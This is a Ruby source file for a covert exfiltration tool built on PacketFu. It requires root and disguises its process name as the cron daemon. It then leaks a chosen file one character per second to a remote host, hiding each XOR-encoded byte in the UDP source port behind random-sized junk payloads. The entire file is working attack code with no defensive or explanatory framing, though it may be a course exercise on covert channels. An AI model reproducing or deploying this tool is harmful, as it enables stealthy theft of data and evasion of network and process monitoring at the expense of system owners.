#!/usr/bin/env ruby
=begin
-------------------------------------------------------------------------------------
--  SOURCE FILE:    covert.rb - 
--
--  PROGRAM:        covert
--                ./covert.rb 
--
--  FUNCTIONS:      
--
--  DATE:           April 2014
--
--  REVISIONS:      See development repo: 
--
--  DESIGNERS:      Chris Wood - chriswood.ca@gmail.com
--
--  PROGRAMMERS:    Chris Wood - chriswood.ca@gmail.com
--
--  NOTES:          
--  
---------------------------------------------------------------------------------------
=end

require 'ipaddress'
require 'resolv'
require 'packetfu'

## Variables
USAGE        = "Proper usage: ./covert.rb dst_ip dst_port file"
PROCESS_MASK = "/usr/sbin/crond -n"
ERR          = "ERROR:"
ERR_PORT     = "#{ERR} Invalid Port"
ERR_IP       = "#{ERR} Invalid IP"
ERR_FILE     = "#{ERR} File does not exist"
IF_DEV       = "wlp2s0"
#CRYPT_KEY    = "haystacksunset lemoncircus"
CRYPT_KEY    = "h"

## Functions

# Displays message and then exits program
#
# @param [String] reason
# - message to display before exiting
def exitReason(reason)
    puts reason
    exit
end

def resolveAddress(dst)
    begin
        return Resolv.getaddress(dst)
    rescue Resolv::ResolvError
        exitReason("#{ERR_IP} or hostname")
    end
end

# Checks port range validity (1-65535)
#
# @param [Integer] num
# - port to check
# @return [bool]
# - true if valid, false if not
def validPort(num)
    if num >= 1 && num <= 65535
        return true
    else
        return false 
    end
end

def encrypt(word)
    word.bytes.zip(CRYPT_KEY.bytes).map { |(a,b)| a ^ b}.pack('c*')
# "hello world".bytes.zip("haystacksunset lemoncircus".bytes).map { |(a,b)| a ^ b}.pack('c*')
end

def makePayload
    Array.new(rand(256)) { rand(256) }.pack('c*')
end

def sendData(data)
    pkt = PacketFu::UDPPacket.new(:config => @config, :flavor => "Linux")

    #pkt.udp_src  = rand(0xffff-35535) + 35535 # random port between 30k and 65535
    pkt.udp_dst  = @port
    pkt.ip_daddr = @ip
    pkt::udp_header.body = makePayload # randomly sized binary data

    pkt.udp_src = 35535 + encrypt(data).bytes[0]
    pkt.recalc # MUST RECALC CHECKSUM or receiver will throw out

    pkt.to_w # send the packet
end

## Main

# check for root
raise 'Must run as root' unless Process.uid == 0

# rename process
$0 = PROCESS_MASK

# check args
if ARGV.count != 3
    exitReason(USAGE)
end

@ip = resolveAddress(ARGV[0])
@port = ARGV[1].chomp.to_i
filename = ARGV[2]

ARGV.clear # clear for STDIN, if applicable

if !IPAddress::valid?(@ip) # check valid dst address
    exitReason(ERR_IP)
elsif !validPort(@port) # check valid port
    exitReason(ERR_PORT)
elsif !File.file?(filename) # check file exists
    exitReason(ERR_FILE)
end

@config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> IF_DEV)).config

File.open(filename, 'r') do |f|
    f.each_char do |c|
        sendData(c)
        sleep 1
    end
end


